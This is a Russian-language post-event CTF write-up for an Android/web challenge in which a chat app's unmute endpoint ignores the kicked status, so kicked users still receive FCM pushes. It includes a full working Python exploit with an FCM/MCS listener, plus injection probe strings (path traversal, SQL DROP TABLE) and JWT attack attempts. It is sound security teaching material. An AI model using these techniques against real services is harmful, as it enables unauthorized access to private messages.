# МАКСИМУМ

**Категория:** Mobile / Web (Android)
**Сложность:** 🟡 Средняя (1000 баллов, 0 решений на ивенте)
**APK:** `MAXIMUM.apk`
**Backend:** `https://maximum-stagp33g.alfactf.ru`
**Invite:** `maximum://invite/ffa1b2c3-d4e5-f6a7-8b90-c123d456e789`
**Автор:** Даниил Фукалов ([@denciks](https://t.me/denciks)), [SPbCTF](https://t.me/spbctf)
**Флаг:** `alfa{gR0up_ChAt_1DOr_M3S5EnG3r_PWN3D}`

> **Post-event writeup.** На самом ивенте задачу не решила ни одна команда (0 решений на платформе). Этот разбор написан 29 апреля 2026 — после того, как нам стал доступен корректный путь решения от другой команды. Включаем как пример того, **как нужно было действовать**, и фиксируем, на чём именно мы споткнулись на ивенте.

## Условие

> В походе важна надёжная связь между участниками, и она должна работать хорошо не только на парковке, но и в процессе восхождения. К счастью, вышло новое приложение MAXIMUM, которое будет ловить даже на самом пике горы.
>
> В честь выхода приложения запущена масштабная рекламная кампания, в рамках которой планируется поход. Чтобы попасть в этот поход, нужно добавиться в чат, где будут объявлены оргмоменты и точка сбора.
>
> Однако, из-за колоссального наплыва желающих установить приложение, было принято решение ограничить количество участников похода, поэтому число участников чата ограничили 50, новых автоматически исключают.
>
> Вы очень хотите попасть в поход, и если вы придёте на точку сбора, вас точно не выгонят. Узнайте место встречи — и поторопитесь, иначе восхождение пройдёт без вашего участия.

## Анализ системы

APK декомпилируется через jadx без обфускации. В клиенте и манифесте сразу видны два отдельных канала:

**HTTP API:**

```text
POST /api/register
POST /api/login
PUT  /api/users/me/fcm-token
GET  /api/chats
GET  /api/chats/{chatId}/messages
POST /api/chats/{chatId}/join
POST /api/chats/{chatId}/messages
POST /api/chats/{chatId}/mute
POST /api/chats/{chatId}/unmute
POST /api/chats/dm
```

**Push-канал — Firebase Cloud Messaging.** Это и есть ключ к задаче: в `AndroidManifest.xml` зарегистрирован `FirebaseMessagingService`, в ресурсах лежит `google-services.json` с проектным `application_id`/`api_key`, а сам сервис в коде разбирает входящие push'ы по полю `type` со значениями `message` и `kicked`. То есть **сообщения чата приходят клиенту не запросом `GET /messages`, а через FCM-stream**.

Deep-link `maximum://invite/<uuid>` — стандартный intent-filter; экран чата принимает последний сегмент URI как `chatId` и сразу зовёт `POST /api/chats/{chatId}/join`.

### Поведение «переполненного чата»

Backend на invite-uuid не пускает пользователя в общий чат с 50 участниками. Вместо этого:

1. На `POST /api/chats/<invite_uuid>/join` создаётся **отдельный чат на одного юзера** с именем `CTF Special Invite` (новый `chat_id`, не равный invite-uuid).
2. От лица «организатора» в этот чат летит сообщение «места закончились» — оно приходит как FCM push.
3. Через ~10 секунд backend исключает пользователя: в `/api/chats` запись принимает вид

   ```json
   {
     "id": "531bbfc5-849c-4988-9673-4fc9bed1a10c",
     "name": "CTF Special Invite",
     "is_group": 1,
     "is_kicked": 1,
     "is_muted": 1
   }
   ```

После этого `GET /api/chats/<chat_id>/messages` возвращает 403, новых сообщений по HTTP не приходит. Но запись о чате из списка не пропадает — остаётся как «надгробие».

### Уязвимость

`POST /api/chats/{chatId}/unmute` проверяет только владельца chat-mute-флага и **не проверяет `is_kicked`**. То есть выгнанный из чата пользователь может «снять mute» с собственной (уже мёртвой) подписки. После этого backend считает его легитимным получателем push-уведомлений на этот `chat_id` и **продолжает слать ему FCM-стэнзы**, хотя HTTP-доступ к `/messages` всё ещё закрыт.

Сообщение с координатами точки сбора рассылается организатором после старта похода и приходит push'ом всем «не замьюченным» подписчикам — включая нашего «призрака», которого только что unmute'нули.

Класс — **IDOR на mute-state + рассинхрон HTTP-авторизации и push-канала**: разные пути проверки прав (HTTP-handler смотрит `is_kicked`, FCM-broadcaster — только `is_muted`).

## Эксплуатация

```
[1] Register → JWT
[2] Получить РЕАЛЬНЫЙ FCM token (gcm check-in + FCM register к проекту из google-services.json)
[3] PUT /api/users/me/fcm-token = этот реальный токен
[4] Открыть TLS-сокет на mtalk.google.com:5228 (FCM/MCS) и слушать DataMessageStanza
[5] POST /api/chats/<INVITE_UUID>/join → запомнить новый chat_id
[6] Дождаться is_kicked=1, is_muted=1 (опрос /api/chats каждые 2с)
[7] POST /api/chats/<new_chat_id>/unmute
[8] В FCM-стриме приходит push с text="координаты точки сборки: alfa{...}"
```

### Почему «реальный» FCM-токен

`PUT /api/users/me/fcm-token` принимает любую строку (валидация на стороне сервера отсутствует), но рассылка идёт через настоящий Google FCM. Если положить в БД мусор (`xxx`, `abc/topics/...`), backend честно отправит push на этот fake-token — и Google его молча выбросит. Никаких ошибок назад не вернётся. Получить push можно только по токену, который реально зарегистрирован в FCM проекта из APK.

Минимальный путь — поднять локального «псевдо-Android»: библиотека `push_receiver` делает gcm check-in и FCM register для нужного `application_id`, отдаёт `fcm_token`, `androidId`, `securityToken`. Дальше на эти креды поднимается TLS-соединение `mtalk.google.com:5228` и поверх MCS-протокола (Google’s protobuf-based) приходят `DataMessageStanza` с полями `app_data` — там и лежит payload пуша.

### Самодостаточный эксплоит

```python
import json, queue, socket, ssl, threading, time, urllib.request, uuid

from push_receiver import push_receiver as pr
from push_receiver.mcs_pb2 import DataMessageStanza, HeartbeatAck, HeartbeatPing, LoginRequest
import fcm_android_probe  # хелпер: создаёт реальный FCM-токен под проект из google-services.json

BACKEND = "https://maximum-stagp33g.alfactf.ru"
INVITE  = "ffa1b2c3-d4e5-f6a7-8b90-c123d456e789"


def http(method, path, body=None, token=None):
    headers = {"User-Agent": "MAXIMUM/1.0"}
    data = None
    if body is not None:
        data = json.dumps(body, ensure_ascii=False).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(BACKEND + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=25) as resp:
        text = resp.read().decode("utf-8", "replace")
        return resp.status, (json.loads(text) if text else None)


def listen(creds, outq):
    pr.gcm_check_in(**creds["gcm"])
    sock = socket.create_connection(("mtalk.google.com", 5228), timeout=25)
    sock.settimeout(10)
    stream = ssl.create_default_context().wrap_socket(sock, server_hostname="mtalk.google.com")

    req = LoginRequest()
    req.adaptive_heartbeat = False
    req.auth_service = 2
    req.auth_token = creds["gcm"]["securityToken"]
    req.id = "android-35"
    req.domain = "mcs.android.com"
    req.device_id = "android-%x" % int(creds["gcm"]["androidId"])
    req.network_type = 1
    req.resource = creds["gcm"]["androidId"]
    req.user = creds["gcm"]["androidId"]
    req.use_rmq2 = True
    req.setting.add(name="new_vc", value="1")
    pr.__send(stream, req)
    pr.__recv(stream, first=True)

    while True:
        try:
            pkt = pr.__recv(stream)
        except socket.timeout:
            continue
        if isinstance(pkt, HeartbeatPing):
            pr.__send(stream, HeartbeatAck())
            continue
        if isinstance(pkt, DataMessageStanza):
            outq.put({x.key: x.value for x in pkt.app_data})


# 1. register
username = "ateam_" + uuid.uuid4().hex[:12]
_, body = http("POST", "/api/register", {"username": username, "password": "x" * 16})
token = body["token"]

# 2. get real FCM credentials and bind them
creds = fcm_android_probe.create_fcm_token()
http("PUT", "/api/users/me/fcm-token", {"fcm_token": creds["fcm_token"]}, token)

# 3. start FCM listener
events = queue.Queue()
threading.Thread(target=listen, args=(creds, events), daemon=True).start()
time.sleep(5)

# 4. join invite → ghost chat
_, chat = http("POST", f"/api/chats/{INVITE}/join", token=token)
chat_id = chat["id"]

# 5. wait for kick to settle (is_kicked=1, is_muted=1)
while True:
    _, chats = http("GET", "/api/chats", token=token)
    me_chat = next(c for c in chats if c["id"] == chat_id)
    if me_chat.get("is_kicked") == 1 and me_chat.get("is_muted") == 1:
        break
    time.sleep(2)

# 6. IDOR: unmute the dead ghost subscription
http("POST", f"/api/chats/{chat_id}/unmute", token=token)

# 7. coords push arrives over FCM
while True:
    event = events.get()
    text = event.get("text") or event.get("gcm.notification.body") or ""
    if "alfa{" in text:
        print(text)
        break
```

После `/unmute` через несколько десятков секунд по MCS-стриму прилетает:

```text
координаты точки сборки: alfa{gR0up_ChAt_1DOr_M3S5EnG3r_PWN3D}
```

## Где мы застряли на ивенте

Полный реверс APK дал нам и API-эндпоинты, и идею unmute, и понимание ghost-чата — мы написали 29 итераций solve-скриптов (`solve12_unmute.py`, `solve14_unmute_wait.py`, `solve20_pre_unmute.py` и т.д.) и **угадали правильную дыру** (`/unmute` после kick'а). Но вместо того, чтобы поднять FCM-listener, мы поллили `GET /api/chats/{id}/messages` — а HTTP-канал после kick'а всегда отвечает 403. Корутины с поллингом честно работали по две минуты после unmute и видели пустоту.

В одном из ранних скриптов (`solve11_rejoin.py:36-39`) мы даже добрались до `/api/users/me/fcm-token` — но трактовали этот endpoint **как инъекционный вектор**:

```python
for tok in ["xxx", "abc/topics/chat_real", json.dumps({"x":"y"}), "../../etc/passwd", "'; DROP TABLE--"]:
    rr = s.put(f"{BASE}/api/users/me/fcm-token", json={"fcm_token": tok})
```

Все варианты прошли с 200 OK, мы пометили endpoint как «не интересен» и пошли искать SQLi/path-traversal в других местах. Гипотезы «FCM — это и есть основной канал доставки сообщений, к которому надо подключиться» в нашем journal'е не было.

Параллельно мы потратили циклы на тупиковые направления:

- `solve28_ws_and_jwt.py` — перебор путей `/ws`, `/api/ws`, `/socket.io`, `/realtime` и т.п. в надежде найти push-канал в WebSocket'ах. Канала там нет вообще, реалтайм только через FCM.
- `solve27_dm_actors.py` — DM-битва ботам-«организаторам» с командами `/start`, `/coords`, `/help`. Авто-ответов нет.
- `solve8_jwt.py`, JWT alg=none, kid-injection, перебор HS256-секретов — JWT валиден.
- `solve29_poll_ghost.py` — тот же поллинг, но 130 секунд после unmute. Пусто.

**Корневая причина:** в `recon`-фазе мы прочитали `AndroidManifest.xml`, увидели `FirebaseMessagingService`, **записали в notes как «использует Firebase для push»** — и не извлекли из этого, что весь чат-стрим клиента построен на FCM. APK не умеет показывать новые сообщения иначе, чем через push — это видно по тому, что в коде нет polling-loop'а на `/messages`. Этот факт надо было поднять до уровня гипотезы H1.

## Урок

При mobile-задачах с FCM/APNs **поднимай настоящий push-listener** до того, как начинать эксплуатацию. Если в APK есть `FirebaseMessagingService` или эквивалент, проверь:

1. Реально ли клиент достаёт основной контент через push, а не через REST-поллинг?
2. Можно ли подменить или зарегистрировать свой FCM-токен на сервере?
3. Что произойдёт, если триггернуть событие на сервере — приходит ли push на наш зарегистрированный токен?

Инструмент: библиотека [`push_receiver`](https://github.com/Francesco149/push_receiver) — поднимает gcm check-in + FCM register + MCS-listener из Python без эмулятора Android. Альтернатива тяжелее — Frida-hook на `FirebaseMessagingService.onMessageReceived` в живом эмуляторе, но это лишний оверхед, если нужно просто поймать payload пуша.

«Замьючен по HTTP» ≠ «не получит push»: это два независимых auth-pipeline'а, и баг в одном из них даёт работающую утечку, даже если другой полностью закрыт.

## Файлы

- [`solve/exploit.py`](solve/exploit.py) — корректный самодостаточный эксплоит (register → real FCM token → FCM listener → join → wait kick → unmute → читаем push с координатами).
- [`solve/NOTES.md`](solve/NOTES.md) — журнал наших ивент-гипотез и фиксация момента, где не хватило мысли про FCM-listener.

## Ссылки

- [`push_receiver`](https://github.com/Francesco149/push_receiver) — Python-клиент для FCM/MCS без Android-стэка
- [Firebase Cloud Messaging — server-to-client message structure](https://firebase.google.com/docs/cloud-messaging/concept-options)
- [MCS protocol reference (reverse-engineered)](https://github.com/Francesco149/push_receiver/blob/master/push_receiver/mcs.proto)
